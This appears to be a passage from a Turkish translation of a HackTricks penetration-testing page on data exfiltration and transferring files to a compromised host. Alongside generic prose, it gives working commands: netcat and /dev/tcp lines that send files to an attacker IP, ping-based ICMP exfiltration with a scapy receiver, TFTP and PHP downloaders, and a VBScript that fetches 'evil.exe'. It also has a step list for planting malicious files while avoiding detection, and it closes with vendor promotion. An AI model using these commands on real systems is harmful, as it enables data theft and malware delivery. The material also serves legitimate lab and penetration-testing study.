Dosya transfer protokolleri, verilerin bir sistemden başka bir sisteme aktarılmasını sağlayan protokollerdir. Saldırganlar, dosya transfer protokolleri kullanarak hedef sistemden verileri çalabilir ve dışarıya aktarabilir. Örnek dosya transfer protokolleri arasında FTP (File Transfer Protocol), SFTP (Secure File Transfer Protocol) ve SCP (Secure Copy Protocol) bulunur.

### E-posta

E-posta, verilerin elektronik olarak iletilmesini sağlayan bir iletişim yöntemidir. Saldırganlar, hedef sistemden çaldıkları verileri e-posta yoluyla dışarıya aktarabilirler. Bu yöntem, verilerin hızlı ve kolay bir şekilde başka bir sistem veya sunucuya iletilmesini sağlar.

### Web Tabanlı Yöntemler

Web tabanlı yöntemler, saldırganların hedef sistemden verileri çalmak ve dışarıya aktarmak için web tabanlı araçlar veya yöntemler kullanmasını içerir. Örneğin, saldırganlar, hedef sistemdeki verileri bir web uygulaması aracılığıyla çalabilir ve bu verileri sunucularına veya başka bir hedefe aktarabilir.

### Taşınabilir Bellek Aygıtları

Taşınabilir bellek aygıtları, verilerin bir sistemden başka bir sisteme taşınmasını sağlayan aygıtlardır. Saldırganlar, hedef sistemden çaldıkları verileri taşınabilir bellek aygıtlarına kopyalayabilir ve bu aygıtları kullanarak verileri dışarıya aktarabilir.

### Ağ Protokolleri

Ağ protokolleri, verilerin bir ağ üzerinde iletilmesini sağlayan protokollerdir. Saldırganlar, hedef ağdaki verilere erişim sağladıklarında, ağ protokolleri kullanarak bu verileri dışarıya aktarabilirler. Örnek ağ protokolleri arasında HTTP (Hypertext Transfer Protocol), DNS (Domain Name System) ve ICMP (Internet Control Message Protocol) bulunur.

## Veri Sızdırma Araçları

### Netcat

Netcat, ağ üzerinde veri iletişimi sağlayan bir araçtır. Saldırganlar, Netcat'i kullanarak hedef sistemden çaldıkları verileri başka bir sistem veya sunucuya aktarabilirler.

### OpenSSL

OpenSSL, güvenli iletişim sağlamak için kullanılan bir kriptografik kütüphanedir. Saldırganlar, OpenSSL'i kullanarak verileri şifreleyebilir ve dışarıya aktarabilir.

### Wireshark

Wireshark, ağ trafiğini analiz etmek ve izlemek için kullanılan bir araçtır. Saldırganlar, Wireshark'ı kullanarak hedef ağdaki verileri yakalayabilir ve bu verileri dışarıya aktarabilir.

### Meterpreter

Meterpreter, bir saldırganın hedef sistemdeki verilere erişim sağlamasını ve bu verileri dışarıya aktarmasını sağlayan bir araçtır. Meterpreter, birçok veri sızdırma yöntemini destekler ve saldırganlara esnek bir veri sızdırma yeteneği sunar.

### Cobalt Strike

Cobalt Strike, bir saldırganın hedef sistemdeki verilere erişim sağlamasını ve bu verileri dışarıya aktarmasını sağlayan bir saldırı simülasyon aracıdır. Cobalt Strike, çeşitli veri sızdırma yöntemlerini destekler ve saldırganlara kapsamlı bir veri sızdırma yeteneği sunar.

## Veri Sızdırma Önlemleri

Veri sızdırma saldırılarını önlemek için aşağıdaki önlemleri almak önemlidir:

- Güçlü şifreler kullanın ve düzenli olarak değiştirin.
- Güvenlik duvarları ve güvenlik yazılımları kullanarak ağ trafiğini izleyin ve filtreleyin.
- Hassas verileri şifreleyin ve erişimi sınırlayın.
- Güvenlik açıklarını düzeltmek için düzenli olarak güncellemeleri uygulayın.
- Personelinize güvenlik eğitimi verin ve bilinçlendirme programları düzenleyin.
- Veri sızdırma saldırılarını izlemek ve tespit etmek için güvenlik olaylarına yanıt (SIEM) sistemleri kullanın.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

Saldırganın SSHd çalıştırması gerekmektedir.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

Eğer kurbanın SSH'si varsa, saldırgan kurbandan saldırganın bir dizinini bağlayabilir.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

NC (Netcat) bir ağ aracıdır ve birçok farklı amaç için kullanılabilir. Exfiltration (veri sızdırma) için kullanıldığında, hedef sistemden veri çalmak veya hedef sistemdeki veriyi başka bir sistemde depolamak için kullanılabilir.

NC, bir sunucu ve bir istemci modunda çalışabilir. Sunucu modunda, NC bir portu dinler ve gelen bağlantıları kabul eder. İstemci modunda ise, NC belirli bir IP adresi ve port numarasına bağlanır.

Veri sızdırma için NC kullanırken, hedef sistemdeki veriyi başka bir sistemde depolamak için bir NC sunucusu oluşturmanız gerekebilir. Bu sunucu, hedef sistemden gelen veriyi kabul eder ve başka bir sistemdeki NC istemcisine gönderir.

NC ayrıca, hedef sistemden veri çalmak için de kullanılabilir. Bir NC istemcisi oluşturarak, hedef sistemdeki belirli bir dosyayı veya dizini başka bir sistemdeki NC sunucusuna gönderebilirsiniz.

NC, veri sızdırma işlemlerinde kullanılan birçok protokolü destekler, örneğin TCP, UDP ve ICMP. Bu sayede, farklı ağ ortamlarında ve farklı protokoller üzerinden veri sızdırma işlemleri gerçekleştirebilirsiniz.

NC, basit ve etkili bir araç olmasının yanı sıra, çeşitli işletim sistemlerinde çalışabilir. Bu nedenle, farklı sistemlerdeki veri sızdırma işlemlerinde NC'yi kullanabilirsiniz.

NC, veri sızdırma işlemlerinde kullanılan birçok yöntem ve kaynak arasında sadece bir örnektir. Hedef sistemdeki veriyi başka bir sistemde depolamak veya hedef sistemden veri çalmak için farklı araçlar ve yöntemler de mevcuttur.
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
To download a file from the victim using the `/dev/tcp` method, you can use the following command:

```bash
cat < /dev/tcp/<victim_ip>/<port> > <local_file>
```

Replace `<victim_ip>` with the IP address of the victim machine and `<port>` with the desired port number. `<local_file>` should be replaced with the name of the file you want to save the downloaded content as.

For example, to download a file from a victim with the IP address `192.168.0.100` on port `8080` and save it as `downloaded_file.txt`, you would use the following command:

```bash
cat < /dev/tcp/192.168.0.100/8080 > downloaded_file.txt
```

This command will establish a connection to the victim machine on the specified port and redirect the content to the specified local file.
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Kurbanın bilgisayarına dosya yükleme

Bir saldırgan olarak, hedef sisteme dosya yüklemek isteyebilirsiniz. Bu, hedefin bilgisayarına zararlı bir dosya veya casus yazılım bırakmanızı sağlar. Dosya yükleme işlemi için aşağıdaki adımları izleyebilirsiniz:

1. **Dosya hazırlama**: Yüklemek istediğiniz dosyayı hazırlayın. Bu dosya, hedef sisteme zarar verecek veya bilgileri çalacak bir saldırı aracı olabilir.

2. **Dosya şifreleme**: Dosyanızı şifreleyerek, tespit edilme riskini azaltabilirsiniz. Şifreleme algoritmaları kullanarak dosyanızı şifreleyin.

3. **Dosya bölme**: Dosyanızı daha küçük parçalara bölebilirsiniz. Bu, dosyanın yükleme sırasında tespit edilme riskini azaltır.

4. **Yükleme yöntemi seçme**: Dosyanızı hedef sisteme yüklemek için uygun bir yöntem seçin. Örneğin, e-posta ekleri, USB bellekler veya ağ üzerinden dosya transferi gibi yöntemler kullanabilirsiniz.

5. **Yükleme işlemi**: Seçtiğiniz yöntemi kullanarak dosyanızı hedef sisteme yükleyin. Bu işlem sırasında dikkatli olun ve tespit edilmemek için gerekli önlemleri alın.

Dosyanızı hedef sisteme başarıyla yükledikten sonra, istediğiniz amaç için kullanabilirsiniz. Örneğin, hedef sistemi ele geçirmek, bilgileri çalmak veya başka bir saldırı gerçekleştirmek gibi.
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
## **ICMP**

ICMP (Internet Control Message Protocol), internet kontrol mesajı protokolü olarak bilinen bir ağ protokolüdür. ICMP, IP ağlarında hata mesajlarını ve operasyonel bilgileri iletmek için kullanılır. ICMP, ağ cihazları arasında iletişim sağlamak ve ağ durumunu izlemek için kullanılır.

ICMP, ağ üzerindeki hedef cihazın durumunu kontrol etmek için kullanılabilir. Bu, hedef cihazın erişilebilir olup olmadığını ve ağa bağlı olup olmadığını belirlemek için kullanışlı bir tekniktir.

ICMP ayrıca, ağ üzerindeki hataları tespit etmek ve raporlamak için kullanılır. Örneğin, bir paketin hedefe ulaşamaması durumunda, ICMP hata mesajları göndererek bu durumu bildirebilir.

ICMP ayrıca, ağ üzerindeki performans sorunlarını tespit etmek için kullanılabilir. Ping komutu, ICMP protokolünü kullanarak hedef cihaza bir paket gönderir ve hedef cihazın bu paketi alıp almadığını kontrol eder. Bu, ağ üzerindeki gecikme süresini ve paket kaybını ölçmek için kullanışlı bir tekniktir.

ICMP, ağ üzerindeki bilgileri exfiltrate etmek için kullanılabilecek bir tekniktir. Örneğin, bir saldırgan, hedef cihazdan ICMP paketleri göndererek hassas verileri ağ üzerinden çalabilir. Bu nedenle, ağ güvenliği açısından ICMP trafiği izlenmeli ve gerektiğinde engellenmelidir.
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

Eğer bir SMTP sunucusuna veri gönderebiliyorsanız, Python ile veriyi almak için bir SMTP oluşturabilirsiniz:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

Varsayılan olarak XP ve 2003'te (diğerlerinde kurulum sırasında açıkça eklenmesi gerekmektedir)

Kali'de **TFTP sunucusunu başlatın**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**Python ile TFTP sunucusu:**
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
**Kurban** üzerinde, Kali sunucusuna bağlanın:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

PHP ile bir dosya indirin:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript, kısaltmasıyla Visual Basic Scripting Edition, Microsoft tarafından geliştirilen bir betik dili ve programlama dilidir. VBScript, Windows işletim sistemlerinde kullanılan birçok uygulama ve hizmet tarafından desteklenir.

VBScript, genellikle web tarayıcılarındaki web sayfalarında kullanılan bir betik dili olarak bilinir. Bu dili kullanarak, web sayfalarına etkileşimli özellikler ekleyebilir ve kullanıcılarla etkileşim kurabilirsiniz.

VBScript, aynı zamanda sistem yönetimi ve otomasyonunda da yaygın olarak kullanılır. Dosya işlemleri, ağ bağlantıları, veritabanı erişimi gibi birçok görevi gerçekleştirmek için kullanılabilir.

VBScript, basit ve anlaşılır bir sözdizimine sahiptir. Bu nedenle, yeni başlayanlar için kolayca öğrenilebilir ve kullanılabilir.

VBScript, birçok farklı yöntemle exfiltration (veri sızdırma) işlemlerini gerçekleştirebilir. Bu yöntemler arasında dosya aktarımı, ağ trafiği manipülasyonu ve gizli kanallar kullanma gibi teknikler bulunur.

VBScript kullanarak exfiltration işlemlerini gerçekleştirmek için, hedef sisteme erişim sağlamak ve hedef verileri hedefe iletmek için uygun yöntemleri kullanmak gerekmektedir. Bu yöntemler, hedef sistemin özelliklerine ve güvenlik önlemlerine bağlı olarak değişebilir.

VBScript, güçlü bir betik dili olmasına rağmen, güvenlik açıklarına karşı dikkatli olunması gereken bir dildir. Bu nedenle, VBScript kullanırken güvenlik önlemlerini dikkate almak önemlidir ve güvenlik açıklarını önlemek için en iyi uygulamaları takip etmek gerekmektedir.
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Hedef**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

`debug.exe` programı, sadece ikili dosyaların incelenmesine izin vermekle kalmaz, aynı zamanda onları hex formatından yeniden oluşturma yeteneğine de sahiptir. Bu, bir ikili dosyanın hex formatını sağlayarak `debug.exe`nin ikili dosyayı oluşturabilmesi anlamına gelir. Bununla birlikte, `debug.exe`nin **64 kb boyutuna kadar olan dosyaları birleştirme sınırlaması** olduğunu unutmamak önemlidir.
```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```
Ardından metni windows-shell'e kopyalayıp nc.exe adında bir dosya oluşturulacak.

* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli güvenlik açıklarını bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklam vermek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>
